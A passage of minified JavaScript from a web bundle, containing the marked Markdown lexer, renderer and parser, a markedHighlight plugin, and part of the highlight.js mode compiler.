`+p.raw,this.inlineQueue.at(-1).src=i.text):this.tokens.links[p.tag]||(this.tokens.links[p.tag]={href:p.href,title:p.title});continue}if(p=this.tokenizer.table(t)){t=t.substring(p.raw.length),n.push(p);continue}if(p=this.tokenizer.lheading(t)){t=t.substring(p.raw.length),n.push(p);continue}let l=t;if((o=this.options.extensions)!=null&&o.startBlock){let i=1/0;const d=t.slice(1);let f;this.options.extensions.startBlock.forEach(y=>{f=y.call({lexer:this},d),typeof f=="number"&&f>=0&&(i=Math.min(i,f))}),i<1/0&&i>=0&&(l=t.substring(0,i+1))}if(this.state.top&&(p=this.tokenizer.paragraph(l))){const i=n.at(-1);a&&(i==null?void 0:i.type)==="paragraph"?(i.raw+=`
`+p.raw,i.text+=`
`+p.text,this.inlineQueue.pop(),this.inlineQueue.at(-1).src=i.text):n.push(p),a=l.length!==t.length,t=t.substring(p.raw.length);continue}if(p=this.tokenizer.text(t)){t=t.substring(p.raw.length);const i=n.at(-1);(i==null?void 0:i.type)==="text"?(i.raw+=`
`+p.raw,i.text+=`
`+p.text,this.inlineQueue.pop(),this.inlineQueue.at(-1).src=i.text):n.push(p);continue}if(t){const i="Infinite loop on byte: "+t.charCodeAt(0);if(this.options.silent){console.error(i);break}else throw new Error(i)}}return this.state.top=!0,n}inline(t,n=[]){return this.inlineQueue.push({src:t,tokens:n}),n}inlineTokens(t,n=[]){var p,l,i;let a=t,s=null;if(this.tokens.links){const d=Object.keys(this.tokens.links);if(d.length>0)for(;(s=this.tokenizer.rules.inline.reflinkSearch.exec(a))!=null;)d.includes(s[0].slice(s[0].lastIndexOf("[")+1,-1))&&(a=a.slice(0,s.index)+"["+"a".repeat(s[0].length-2)+"]"+a.slice(this.tokenizer.rules.inline.reflinkSearch.lastIndex))}for(;(s=this.tokenizer.rules.inline.blockSkip.exec(a))!=null;)a=a.slice(0,s.index)+"["+"a".repeat(s[0].length-2)+"]"+a.slice(this.tokenizer.rules.inline.blockSkip.lastIndex);for(;(s=this.tokenizer.rules.inline.anyPunctuation.exec(a))!=null;)a=a.slice(0,s.index)+"++"+a.slice(this.tokenizer.rules.inline.anyPunctuation.lastIndex);let r=!1,o="";for(;t;){r||(o=""),r=!1;let d;if((l=(p=this.options.extensions)==null?void 0:p.inline)!=null&&l.some(y=>(d=y.call({lexer:this},t,n))?(t=t.substring(d.raw.length),n.push(d),!0):!1))continue;if(d=this.tokenizer.escape(t)){t=t.substring(d.raw.length),n.push(d);continue}if(d=this.tokenizer.tag(t)){t=t.substring(d.raw.length),n.push(d);continue}if(d=this.tokenizer.link(t)){t=t.substring(d.raw.length),n.push(d);continue}if(d=this.tokenizer.reflink(t,this.tokens.links)){t=t.substring(d.raw.length);const y=n.at(-1);d.type==="text"&&(y==null?void 0:y.type)==="text"?(y.raw+=d.raw,y.text+=d.text):n.push(d);continue}if(d=this.tokenizer.emStrong(t,a,o)){t=t.substring(d.raw.length),n.push(d);continue}if(d=this.tokenizer.codespan(t)){t=t.substring(d.raw.length),n.push(d);continue}if(d=this.tokenizer.br(t)){t=t.substring(d.raw.length),n.push(d);continue}if(d=this.tokenizer.del(t)){t=t.substring(d.raw.length),n.push(d);continue}if(d=this.tokenizer.autolink(t)){t=t.substring(d.raw.length),n.push(d);continue}if(!this.state.inLink&&(d=this.tokenizer.url(t))){t=t.substring(d.raw.length),n.push(d);continue}let f=t;if((i=this.options.extensions)!=null&&i.startInline){let y=1/0;const h=t.slice(1);let m;this.options.extensions.startInline.forEach(b=>{m=b.call({lexer:this},h),typeof m=="number"&&m>=0&&(y=Math.min(y,m))}),y<1/0&&y>=0&&(f=t.substring(0,y+1))}if(d=this.tokenizer.inlineText(f)){t=t.substring(d.raw.length),d.raw.slice(-1)!=="_"&&(o=d.raw.slice(-1)),r=!0;const y=n.at(-1);(y==null?void 0:y.type)==="text"?(y.raw+=d.raw,y.text+=d.text):n.push(d);continue}if(t){const y="Infinite loop on byte: "+t.charCodeAt(0);if(this.options.silent){console.error(y);break}else throw new Error(y)}}return n}}class gt{constructor(t){A(this,"options");A(this,"parser");this.options=t||be}space(t){return""}code({text:t,lang:n,escaped:a}){var o;const s=(o=(n||"").match($.notSpaceStart))==null?void 0:o[0],r=t.replace($.endingNewline,"")+`
`;return s?'<pre><code class="language-'+pe(s)+'">'+(a?r:pe(r,!0))+`</code></pre>
`:"<pre><code>"+(a?r:pe(r,!0))+`</code></pre>
`}blockquote({tokens:t}){return`<blockquote>
${this.parser.parse(t)}</blockquote>
`}html({text:t}){return t}heading({tokens:t,depth:n}){return`<h${n}>${this.parser.parseInline(t)}</h${n}>
`}hr(t){return`<hr>
`}list(t){const n=t.ordered,a=t.start;let s="";for(let p=0;p<t.items.length;p++){const l=t.items[p];s+=this.listitem(l)}const r=n?"ol":"ul",o=n&&a!==1?' start="'+a+'"':"";return"<"+r+o+`>
`+s+"</"+r+`>
`}listitem(t){var a;let n="";if(t.task){const s=this.checkbox({checked:!!t.checked});t.loose?((a=t.tokens[0])==null?void 0:a.type)==="paragraph"?(t.tokens[0].text=s+" "+t.tokens[0].text,t.tokens[0].tokens&&t.tokens[0].tokens.length>0&&t.tokens[0].tokens[0].type==="text"&&(t.tokens[0].tokens[0].text=s+" "+pe(t.tokens[0].tokens[0].text),t.tokens[0].tokens[0].escaped=!0)):t.tokens.unshift({type:"text",raw:s+" ",text:s+" ",escaped:!0}):n+=s+" "}return n+=this.parser.parse(t.tokens,!!t.loose),`<li>${n}</li>
`}checkbox({checked:t}){return"<input "+(t?'checked="" ':"")+'disabled="" type="checkbox">'}paragraph({tokens:t}){return`<p>${this.parser.parseInline(t)}</p>
`}table(t){let n="",a="";for(let r=0;r<t.header.length;r++)a+=this.tablecell(t.header[r]);n+=this.tablerow({text:a});let s="";for(let r=0;r<t.rows.length;r++){const o=t.rows[r];a="";for(let p=0;p<o.length;p++)a+=this.tablecell(o[p]);s+=this.tablerow({text:a})}return s&&(s=`<tbody>${s}</tbody>`),`<table>
<thead>
`+n+`</thead>
`+s+`</table>
`}tablerow({text:t}){return`<tr>
${t}</tr>
`}tablecell(t){const n=this.parser.parseInline(t.tokens),a=t.header?"th":"td";return(t.align?`<${a} align="${t.align}">`:`<${a}>`)+n+`</${a}>
`}strong({tokens:t}){return`<strong>${this.parser.parseInline(t)}</strong>`}em({tokens:t}){return`<em>${this.parser.parseInline(t)}</em>`}codespan({text:t}){return`<code>${pe(t,!0)}</code>`}br(t){return"<br>"}del({tokens:t}){return`<del>${this.parser.parseInline(t)}</del>`}link({href:t,title:n,tokens:a}){const s=this.parser.parseInline(a),r=ea(t);if(r===null)return s;t=r;let o='<a href="'+t+'"';return n&&(o+=' title="'+pe(n)+'"'),o+=">"+s+"</a>",o}image({href:t,title:n,text:a}){const s=ea(t);if(s===null)return pe(a);t=s;let r=`<img src="${t}" alt="${a}"`;return n&&(r+=` title="${pe(n)}"`),r+=">",r}text(t){return"tokens"in t&&t.tokens?this.parser.parseInline(t.tokens):"escaped"in t&&t.escaped?t.text:pe(t.text)}}class Sn{strong({text:t}){return t}em({text:t}){return t}codespan({text:t}){return t}del({text:t}){return t}html({text:t}){return t}text({text:t}){return t}link({text:t}){return""+t}image({text:t}){return""+t}br(){return""}}class ae{constructor(t){A(this,"options");A(this,"renderer");A(this,"textRenderer");this.options=t||be,this.options.renderer=this.options.renderer||new gt,this.renderer=this.options.renderer,this.renderer.options=this.options,this.renderer.parser=this,this.textRenderer=new Sn}static parse(t,n){return new ae(n).parse(t)}static parseInline(t,n){return new ae(n).parseInline(t)}parse(t,n=!0){var s,r;let a="";for(let o=0;o<t.length;o++){const p=t[o];if((r=(s=this.options.extensions)==null?void 0:s.renderers)!=null&&r[p.type]){const i=p,d=this.options.extensions.renderers[i.type].call({parser:this},i);if(d!==!1||!["space","hr","heading","code","table","blockquote","list","html","paragraph","text"].includes(i.type)){a+=d||"";continue}}const l=p;switch(l.type){case"space":{a+=this.renderer.space(l);continue}case"hr":{a+=this.renderer.hr(l);continue}case"heading":{a+=this.renderer.heading(l);continue}case"code":{a+=this.renderer.code(l);continue}case"table":{a+=this.renderer.table(l);continue}case"blockquote":{a+=this.renderer.blockquote(l);continue}case"list":{a+=this.renderer.list(l);continue}case"html":{a+=this.renderer.html(l);continue}case"paragraph":{a+=this.renderer.paragraph(l);continue}case"text":{let i=l,d=this.renderer.text(i);for(;o+1<t.length&&t[o+1].type==="text";)i=t[++o],d+=`
`+this.renderer.text(i);n?a+=this.renderer.paragraph({type:"paragraph",raw:d,text:d,tokens:[{type:"text",raw:d,text:d,escaped:!0}]}):a+=d;continue}default:{const i='Token with "'+l.type+'" type was not found.';if(this.options.silent)return console.error(i),"";throw new Error(i)}}}return a}parseInline(t,n=this.renderer){var s,r;let a="";for(let o=0;o<t.length;o++){const p=t[o];if((r=(s=this.options.extensions)==null?void 0:s.renderers)!=null&&r[p.type]){const i=this.options.extensions.renderers[p.type].call({parser:this},p);if(i!==!1||!["escape","html","link","image","strong","em","codespan","br","del","text"].includes(p.type)){a+=i||"";continue}}const l=p;switch(l.type){case"escape":{a+=n.text(l);break}case"html":{a+=n.html(l);break}case"link":{a+=n.link(l);break}case"image":{a+=n.image(l);break}case"strong":{a+=n.strong(l);break}case"em":{a+=n.em(l);break}case"codespan":{a+=n.codespan(l);break}case"br":{a+=n.br(l);break}case"del":{a+=n.del(l);break}case"text":{a+=n.text(l);break}default:{const i='Token with "'+l.type+'" type was not found.';if(this.options.silent)return console.error(i),"";throw new Error(i)}}}return a}}class Be{constructor(t){A(this,"options");A(this,"block");this.options=t||be}preprocess(t){return t}postprocess(t){return t}processAllTokens(t){return t}provideLexer(){return this.block?ne.lex:ne.lexInline}provideParser(){return this.block?ae.parse:ae.parseInline}}A(Be,"passThroughHooks",new Set(["preprocess","postprocess","processAllTokens"]));class cs{constructor(...t){A(this,"defaults",fn());A(this,"options",this.setOptions);A(this,"parse",this.parseMarkdown(!0));A(this,"parseInline",this.parseMarkdown(!1));A(this,"Parser",ae);A(this,"Renderer",gt);A(this,"TextRenderer",Sn);A(this,"Lexer",ne);A(this,"Tokenizer",ht);A(this,"Hooks",Be);this.use(...t)}walkTokens(t,n){var s,r;let a=[];for(const o of t)switch(a=a.concat(n.call(this,o)),o.type){case"table":{const p=o;for(const l of p.header)a=a.concat(this.walkTokens(l.tokens,n));for(const l of p.rows)for(const i of l)a=a.concat(this.walkTokens(i.tokens,n));break}case"list":{const p=o;a=a.concat(this.walkTokens(p.items,n));break}default:{const p=o;(r=(s=this.defaults.extensions)==null?void 0:s.childTokens)!=null&&r[p.type]?this.defaults.extensions.childTokens[p.type].forEach(l=>{const i=p[l].flat(1/0);a=a.concat(this.walkTokens(i,n))}):p.tokens&&(a=a.concat(this.walkTokens(p.tokens,n)))}}return a}use(...t){const n=this.defaults.extensions||{renderers:{},childTokens:{}};return t.forEach(a=>{const s={...a};if(s.async=this.defaults.async||s.async||!1,a.extensions&&(a.extensions.forEach(r=>{if(!r.name)throw new Error("extension name required");if("renderer"in r){const o=n.renderers[r.name];o?n.renderers[r.name]=function(...p){let l=r.renderer.apply(this,p);return l===!1&&(l=o.apply(this,p)),l}:n.renderers[r.name]=r.renderer}if("tokenizer"in r){if(!r.level||r.level!=="block"&&r.level!=="inline")throw new Error("extension level must be 'block' or 'inline'");const o=n[r.level];o?o.unshift(r.tokenizer):n[r.level]=[r.tokenizer],r.start&&(r.level==="block"?n.startBlock?n.startBlock.push(r.start):n.startBlock=[r.start]:r.level==="inline"&&(n.startInline?n.startInline.push(r.start):n.startInline=[r.start]))}"childTokens"in r&&r.childTokens&&(n.childTokens[r.name]=r.childTokens)}),s.extensions=n),a.renderer){const r=this.defaults.renderer||new gt(this.defaults);for(const o in a.renderer){if(!(o in r))throw new Error(`renderer '${o}' does not exist`);if(["options","parser"].includes(o))continue;const p=o,l=a.renderer[p],i=r[p];r[p]=(...d)=>{let f=l.apply(r,d);return f===!1&&(f=i.apply(r,d)),f||""}}s.renderer=r}if(a.tokenizer){const r=this.defaults.tokenizer||new ht(this.defaults);for(const o in a.tokenizer){if(!(o in r))throw new Error(`tokenizer '${o}' does not exist`);if(["options","rules","lexer"].includes(o))continue;const p=o,l=a.tokenizer[p],i=r[p];r[p]=(...d)=>{let f=l.apply(r,d);return f===!1&&(f=i.apply(r,d)),f}}s.tokenizer=r}if(a.hooks){const r=this.defaults.hooks||new Be;for(const o in a.hooks){if(!(o in r))throw new Error(`hook '${o}' does not exist`);if(["options","block"].includes(o))continue;const p=o,l=a.hooks[p],i=r[p];Be.passThroughHooks.has(o)?r[p]=d=>{if(this.defaults.async)return Promise.resolve(l.call(r,d)).then(y=>i.call(r,y));const f=l.call(r,d);return i.call(r,f)}:r[p]=(...d)=>{let f=l.apply(r,d);return f===!1&&(f=i.apply(r,d)),f}}s.hooks=r}if(a.walkTokens){const r=this.defaults.walkTokens,o=a.walkTokens;s.walkTokens=function(p){let l=[];return l.push(o.call(this,p)),r&&(l=l.concat(r.call(this,p))),l}}this.defaults={...this.defaults,...s}}),this}setOptions(t){return this.defaults={...this.defaults,...t},this}lexer(t,n){return ne.lex(t,n??this.defaults)}parser(t,n){return ae.parse(t,n??this.defaults)}parseMarkdown(t){return(a,s)=>{const r={...s},o={...this.defaults,...r},p=this.onError(!!o.silent,!!o.async);if(this.defaults.async===!0&&r.async===!1)return p(new Error("marked(): The async option was set to true by an extension. Remove async: false from the parse options object to return a Promise."));if(typeof a>"u"||a===null)return p(new Error("marked(): input parameter is undefined or null"));if(typeof a!="string")return p(new Error("marked(): input parameter is of type "+Object.prototype.toString.call(a)+", string expected"));o.hooks&&(o.hooks.options=o,o.hooks.block=t);const l=o.hooks?o.hooks.provideLexer():t?ne.lex:ne.lexInline,i=o.hooks?o.hooks.provideParser():t?ae.parse:ae.parseInline;if(o.async)return Promise.resolve(o.hooks?o.hooks.preprocess(a):a).then(d=>l(d,o)).then(d=>o.hooks?o.hooks.processAllTokens(d):d).then(d=>o.walkTokens?Promise.all(this.walkTokens(d,o.walkTokens)).then(()=>d):d).then(d=>i(d,o)).then(d=>o.hooks?o.hooks.postprocess(d):d).catch(p);try{o.hooks&&(a=o.hooks.preprocess(a));let d=l(a,o);o.hooks&&(d=o.hooks.processAllTokens(d)),o.walkTokens&&this.walkTokens(d,o.walkTokens);let f=i(d,o);return o.hooks&&(f=o.hooks.postprocess(f)),f}catch(d){return p(d)}}}onError(t,n){return a=>{if(a.message+=`
Please report this to https://github.com/markedjs/marked.`,t){const s="<p>An error occurred:</p><pre>"+pe(a.message+"",!0)+"</pre>";return n?Promise.resolve(s):s}if(n)return Promise.reject(a);throw a}}}const We=new cs;function _(e,t){return We.parse(e,t)}_.options=_.setOptions=function(e){return We.setOptions(e),_.defaults=We.defaults,Za(_.defaults),_};_.getDefaults=fn;_.defaults=be;_.use=function(...e){return We.use(...e),_.defaults=We.defaults,Za(_.defaults),_};_.walkTokens=function(e,t){return We.walkTokens(e,t)};_.parseInline=We.parseInline;_.Parser=ae;_.parser=ae.parse;_.Renderer=gt;_.TextRenderer=Sn;_.Lexer=ne;_.lexer=ne.lex;_.Tokenizer=ht;_.Hooks=Be;_.parse=_;_.options;_.setOptions;_.use;_.walkTokens;_.parseInline;ae.parse;ne.lex;function Ml(e){if(typeof e=="function"&&(e={highlight:e}),!e||typeof e.highlight!="function")throw new Error("Must provide highlight function");return typeof e.langPrefix!="string"&&(e.langPrefix="language-"),typeof e.emptyLangClass!="string"&&(e.emptyLangClass=""),{async:!!e.async,walkTokens(t){if(t.type!=="code")return;const n=aa(t.lang);if(e.async)return Promise.resolve(e.highlight(t.text,n,t.lang||"")).then(sa(t));const a=e.highlight(t.text,n,t.lang||"");if(a instanceof Promise)throw new Error("markedHighlight is not set to async but the highlight function is async. Set the async option to true on markedHighlight to await the async highlight function.");sa(t)(a)},useNewRenderer:!0,renderer:{code(t,n,a){typeof t=="object"&&(a=t.escaped,n=t.lang,t=t.text);const s=aa(n),r=s?e.langPrefix+oa(s):e.emptyLangClass,o=r?` class="${r}"`:"";return t=t.replace(/\n$/,""),`<pre><code${o}>${a?t:oa(t,!0)}
</code></pre>`}}}}function aa(e){return(e||"").match(/\S*/)[0]}function sa(e){return t=>{typeof t=="string"&&t!==e.text&&(e.escaped=!0,e.text=t)}}const ds=/[&<>"']/,Ol=new RegExp(ds.source,"g"),xs=/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/,_l=new RegExp(xs.source,"g"),Nl={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"},ra=e=>Nl[e];function oa(e,t){if(t){if(ds.test(e))return e.replace(Ol,ra)}else if(xs.test(e))return e.replace(_l,ra);return e}function ys(e){return e instanceof Map?e.clear=e.delete=e.set=function(){throw new Error("map is read-only")}:e instanceof Set&&(e.add=e.clear=e.delete=function(){throw new Error("set is read-only")}),Object.freeze(e),Object.getOwnPropertyNames(e).forEach(t=>{const n=e[t],a=typeof n;(a==="object"||a==="function")&&!Object.isFrozen(n)&&ys(n)}),e}class pa{constructor(t){t.data===void 0&&(t.data={}),this.data=t.data,this.isMatchIgnored=!1}ignoreMatch(){this.isMatchIgnored=!0}}function ws(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#x27;")}function xe(e,...t){const n=Object.create(null);for(const a in e)n[a]=e[a];return t.forEach(function(a){for(const s in a)n[s]=a[s]}),n}const Al="</span>",la=e=>!!e.scope,Ll=(e,{prefix:t})=>{if(e.startsWith("language:"))return e.replace("language:","language-");if(e.includes(".")){const n=e.split(".");return[`${t}${n.shift()}`,...n.map((a,s)=>`${a}${"_".repeat(s+1)}`)].join(" ")}return`${t}${e}`};class Dl{constructor(t,n){this.buffer="",this.classPrefix=n.classPrefix,t.walk(this)}addText(t){this.buffer+=ws(t)}openNode(t){if(!la(t))return;const n=Ll(t.scope,{prefix:this.classPrefix});this.span(n)}closeNode(t){la(t)&&(this.buffer+=Al)}value(){return this.buffer}span(t){this.buffer+=`<span class="${t}">`}}const ia=(e={})=>{const t={children:[]};return Object.assign(t,e),t};class bn{constructor(){this.rootNode=ia(),this.stack=[this.rootNode]}get top(){return this.stack[this.stack.length-1]}get root(){return this.rootNode}add(t){this.top.children.push(t)}openNode(t){const n=ia({scope:t});this.add(n),this.stack.push(n)}closeNode(){if(this.stack.length>1)return this.stack.pop()}closeAllNodes(){for(;this.closeNode(););}toJSON(){return JSON.stringify(this.rootNode,null,4)}walk(t){return this.constructor._walk(t,this.rootNode)}static _walk(t,n){return typeof n=="string"?t.addText(n):n.children&&(t.openNode(n),n.children.forEach(a=>this._walk(t,a)),t.closeNode(n)),t}static _collapse(t){typeof t!="string"&&t.children&&(t.children.every(n=>typeof n=="string")?t.children=[t.children.join("")]:t.children.forEach(n=>{bn._collapse(n)}))}}class Hl extends bn{constructor(t){super(),this.options=t}addText(t){t!==""&&this.add(t)}startScope(t){this.openNode(t)}endScope(){this.closeNode()}__addSublanguage(t,n){const a=t.root;n&&(a.scope=`language:${n}`),this.add(a)}toHTML(){return new Dl(this,this.options).value()}finalize(){return this.closeAllNodes(),!0}}function ze(e){return e?typeof e=="string"?e:e.source:null}function fs(e){return Te("(?=",e,")")}function Il(e){return Te("(?:",e,")*")}function jl(e){return Te("(?:",e,")?")}function Te(...e){return e.map(n=>ze(n)).join("")}function Ul(e){const t=e[e.length-1];return typeof t=="object"&&t.constructor===Object?(e.splice(e.length-1,1),t):{}}function Tn(...e){return"("+(Ul(e).capture?"":"?:")+e.map(a=>ze(a)).join("|")+")"}function us(e){return new RegExp(e.toString()+"|").exec("").length-1}function Jl(e,t){const n=e&&e.exec(t);return n&&n.index===0}const Bl=/\[(?:[^\\\]]|\\.)*\]|\(\??|\\([1-9][0-9]*)|\\./;function Cn(e,{joinWith:t}){let n=0;return e.map(a=>{n+=1;const s=n;let r=ze(a),o="";for(;r.length>0;){const p=Bl.exec(r);if(!p){o+=r;break}o+=r.substring(0,p.index),r=r.substring(p.index+p[0].length),p[0][0]==="\\"&&p[1]?o+="\\"+String(Number(p[1])+s):(o+=p[0],p[0]==="("&&n++)}return o}).map(a=>`(${a})`).join(t)}const Fl=/\b\B/,hs="[a-zA-Z]\\w*",Pn="[a-zA-Z_]\\w*",gs="\\b\\d+(\\.\\d+)?",ms="(-?)(\\b0[xX][a-fA-F0-9]+|(\\b\\d+(\\.\\d*)?|\\.\\d+)([eE][-+]?\\d+)?)",ks="\\b(0b[01]+)",Vl="!|!=|!==|%|%=|&|&&|&=|\\*|\\*=|\\+|\\+=|,|-|-=|/=|/|:|;|<<|<<=|<=|<|===|==|=|>>>=|>>=|>=|>>>|>>|>|\\?|\\[|\\{|\\(|\\^|\\^=|\\||\\|=|\\|\\||~",ql=(e={})=>{const t=/^#![ ]*\//;return e.binary&&(e.begin=Te(t,/.*\b/,e.binary,/\b.*/)),xe({scope:"meta",begin:t,end:/$/,relevance:0,"on:begin":(n,a)=>{n.index!==0&&a.ignoreMatch()}},e)},$e={begin:"\\\\[\\s\\S]",relevance:0},zl={scope:"string",begin:"'",end:"'",illegal:"\\n",contains:[$e]},$l={scope:"string",begin:'"',end:'"',illegal:"\\n",contains:[$e]},Xl={begin:/\b(a|an|the|are|I'm|isn't|don't|doesn't|won't|but|just|should|pretty|simply|enough|gonna|going|wtf|so|such|will|you|your|they|like|more)\b/},vt=function(e,t,n={}){const a=xe({scope:"comment",begin:e,end:t,contains:[]},n);a.contains.push({scope:"doctag",begin:"[ ]*(?=(TODO|FIXME|NOTE|BUG|OPTIMIZE|HACK|XXX):)",end:/(TODO|FIXME|NOTE|BUG|OPTIMIZE|HACK|XXX):/,excludeBegin:!0,relevance:0});const s=Tn("I","a","is","so","us","to","at","if","in","it","on",/[A-Za-z]+['](d|ve|re|ll|t|s|n)/,/[A-Za-z]+[-][a-z]+/,/[A-Za-z][a-z]{2,}/);return a.contains.push({begin:Te(/[ ]+/,"(",s,/[.]?[:]?([.][ ]|[ ])/,"){3}")}),a},Gl=vt("//","$"),Yl=vt("/\\*","\\*/"),Kl=vt("#","$"),Ql={scope:"number",begin:gs,relevance:0},Zl={scope:"number",begin:ms,relevance:0},ei={scope:"number",begin:ks,relevance:0},ti={scope:"regexp",begin:/\/(?=[^/\n]*\/)/,end:/\/[gimuy]*/,contains:[$e,{begin:/\[/,end:/\]/,relevance:0,contains:[$e]}]},ni={scope:"title",begin:hs,relevance:0},ai={scope:"title",begin:Pn,relevance:0},si={begin:"\\.\\s*"+Pn,relevance:0},ri=function(e){return Object.assign(e,{"on:begin":(t,n)=>{n.data._beginMatch=t[1]},"on:end":(t,n)=>{n.data._beginMatch!==t[1]&&n.ignoreMatch()}})};var rt=Object.freeze({__proto__:null,APOS_STRING_MODE:zl,BACKSLASH_ESCAPE:$e,BINARY_NUMBER_MODE:ei,BINARY_NUMBER_RE:ks,COMMENT:vt,C_BLOCK_COMMENT_MODE:Yl,C_LINE_COMMENT_MODE:Gl,C_NUMBER_MODE:Zl,C_NUMBER_RE:ms,END_SAME_AS_BEGIN:ri,HASH_COMMENT_MODE:Kl,IDENT_RE:hs,MATCH_NOTHING_RE:Fl,METHOD_GUARD:si,NUMBER_MODE:Ql,NUMBER_RE:gs,PHRASAL_WORDS_MODE:Xl,QUOTE_STRING_MODE:$l,REGEXP_MODE:ti,RE_STARTERS_RE:Vl,SHEBANG:ql,TITLE_MODE:ni,UNDERSCORE_IDENT_RE:Pn,UNDERSCORE_TITLE_MODE:ai});function oi(e,t){e.input[e.index-1]==="."&&t.ignoreMatch()}function pi(e,t){e.className!==void 0&&(e.scope=e.className,delete e.className)}function li(e,t){t&&e.beginKeywords&&(e.begin="\\b("+e.beginKeywords.split(" ").join("|")+")(?!\\.)(?=\\b|\\s)",e.__beforeBegin=oi,e.keywords=e.keywords||e.beginKeywords,delete e.beginKeywords,e.relevance===void 0&&(e.relevance=0))}function ii(e,t){Array.isArray(e.illegal)&&(e.illegal=Tn(...e.illegal))}function ci(e,t){if(e.match){if(e.begin||e.end)throw new Error("begin & end are not supported with match");e.begin=e.match,delete e.match}}function di(e,t){e.relevance===void 0&&(e.relevance=1)}const xi=(e,t)=>{if(!e.beforeMatch)return;if(e.starts)throw new Error("beforeMatch cannot be used with starts");const n=Object.assign({},e);Object.keys(e).forEach(a=>{delete e[a]}),e.keywords=n.keywords,e.begin=Te(n.beforeMatch,fs(n.begin)),e.starts={relevance:0,contains:[Object.assign(n,{endsParent:!0})]},e.relevance=0,delete n.beforeMatch},yi=["of","and","for","in","not","or","if","then","parent","list","value"],wi="keyword";function Ws(e,t,n=wi){const a=Object.create(null);return typeof e=="string"?s(n,e.split(" ")):Array.isArray(e)?s(n,e):Object.keys(e).forEach(function(r){Object.assign(a,Ws(e[r],t,r))}),a;function s(r,o){t&&(o=o.map(p=>p.toLowerCase())),o.forEach(function(p){const l=p.split("|");a[l[0]]=[r,fi(l[0],l[1])]})}}function fi(e,t){return t?Number(t):ui(e)?0:1}function ui(e){return yi.includes(e.toLowerCase())}const ca={},me=e=>{console.error(e)},da=(e,...t)=>{console.log(`WARN: ${e}`,...t)},ve=(e,t)=>{ca[`${e}/${t}`]||(console.log(`Deprecated as of ${e}. ${t}`),ca[`${e}/${t}`]=!0)},mt=new Error;function Ss(e,t,{key:n}){let a=0;const s=e[n],r={},o={};for(let p=1;p<=t.length;p++)o[p+a]=s[p],r[p+a]=!0,a+=us(t[p-1]);e[n]=o,e[n]._emit=r,e[n]._multi=!0}function hi(e){if(Array.isArray(e.begin)){if(e.skip||e.excludeBegin||e.returnBegin)throw me("skip, excludeBegin, returnBegin not compatible with beginScope: {}"),mt;if(typeof e.beginScope!="object"||e.beginScope===null)throw me("beginScope must be object"),mt;Ss(e,e.begin,{key:"beginScope"}),e.begin=Cn(e.begin,{joinWith:""})}}function gi(e){if(Array.isArray(e.end)){if(e.skip||e.excludeEnd||e.returnEnd)throw me("skip, excludeEnd, returnEnd not compatible with endScope: {}"),mt;if(typeof e.endScope!="object"||e.endScope===null)throw me("endScope must be object"),mt;Ss(e,e.end,{key:"endScope"}),e.end=Cn(e.end,{joinWith:""})}}function mi(e){e.scope&&typeof e.scope=="object"&&e.scope!==null&&(e.beginScope=e.scope,delete e.scope)}function ki(e){mi(e),typeof e.beginScope=="string"&&(e.beginScope={_wrap:e.beginScope}),typeof e.endScope=="string"&&(e.endScope={_wrap:e.endScope}),hi(e),gi(e)}function Wi(e){function t(o,p){return new RegExp(ze(o),"m"+(e.case_insensitive?"i":"")+(e.unicodeRegex?"u":"")+(p?"g":""))}class n{constructor(){this.matchIndexes={},this.regexes=[],this.matchAt=1,this.position=0}addRule(p,l){l.position=this.position++,this.matchIndexes[this.matchAt]=l,this.regexes.push([l,p]),this.matchAt+=us(p)+1}compile(){this.regexes.length===0&&(this.exec=()=>null);const p=this.regexes.map(l=>l[1]);this.matcherRe=t(Cn(p,{joinWith:"|"}),!0),this.lastIndex=0}exec(p){this.matcherRe.lastIndex=this.lastIndex;const l=this.matcherRe.exec(p);if(!l)return null;const i=l.findIndex((f,y)=>y>0&&f!==void 0),d=this.matchIndexes[i];return l.splice(0,i),Object.assign(l,d)}}class a{constructor(){this.rules=[],this.multiRegexes=[],this.count=0,this.lastIndex=0,this.regexIndex=0}getMatcher(p){if(this.multiRegexes[p])return this.multiRegexes[p];const l=new n;return this.rules.slice(p).forEach(([i,d])=>l.addRule(i,d)),l.compile(),this.multiRegexes[p]=l,l}resumingScanAtSamePosition(){return this.regexIndex!==0}considerAll(){this.regexIndex=0}addRule(p,l){this.rules.push([p,l]),l.type==="begin"&&this.count++}exec(p){const l=this.getMatcher(this.regexIndex);l.lastIndex=this.lastIndex;let i=l.exec(p);if(this.resumingScanAtSamePosition()&&!(i&&i.index===this.lastIndex)){const d=this.getMatcher(0);d.lastIndex=this.lastIndex+1,i=d.exec(p)}return i&&(this.regexIndex+=i.position+1,this.regexIndex===this.count&&this.considerAll()),i}}function s(o){const p=new a;return o.contains.forEach(l=>p.addRule(l.begin,{rule:l,type:"begin"})),o.terminatorEnd&&p.addRule(o.terminatorEnd,{type:"end"}),o.illegal&&p.addRule(o.illegal,{type:"illegal"}),p}function r(o,p){const l=o;if(o.isCompiled)return l;[pi,ci,ki,xi].forEach(d=>d(o,p)),e.compilerExtensions.forEach(d=>d(o,p)),o.__beforeBegin=null,[li,ii,di].forEach(d=>d(o,p)),o.isCompiled=!0;let i=null;return typeof o.keywords=="object"&&o.keywords.$pattern&&(o.keywords=Object.assign({},o.keywords),i=o.keywords.$pattern,delete o.keywords.$pattern),i=i||/\w+/,o.keywords&&(o.keywords=Ws(o.keywords,e.case_insensitive)),l.keywordPatternRe=t(i,!0),p&&(o.begin||(o.begin=/\B|\b/),l.beginRe=t(l.begin),!o.end&&!o.endsWithParent&&(o.end=/\B|\b/),o.end&&(l.endRe=t(l.end)),l.terminatorEnd=ze(l.end)||"",o.endsWithParent&&p.terminatorEnd&&(l.terminatorEnd+=(o.end?"|":"")+p.terminatorEnd)),o.illegal&&(l.illegalRe=t(o.illegal)),o.contains||(o.contains=[]),o.contains=[].concat(...o.contains.map(function(d){return Si(d==="self"?o:d)})),o.contains.forEach(function(d){r(d,l)}),o.starts&&r(o.starts,p),l.matcher=s(l),l}if(e.compilerExtensions||(e.compilerExtensions=[]),e.contains&&e.contains.includes("self"))throw new Error("ERR: contains `self` is not supported at the top-level of a language.  See documentation.");return e.classNameAliases=xe(e.classNameAliases||{}),r(e)}function bs(e){return e?e.endsWithParent||bs(e.starts):!1}function Si(e){return e.variants&&!e.cachedVariants&&(e.cachedVariants=e.variants.map(function(t){return 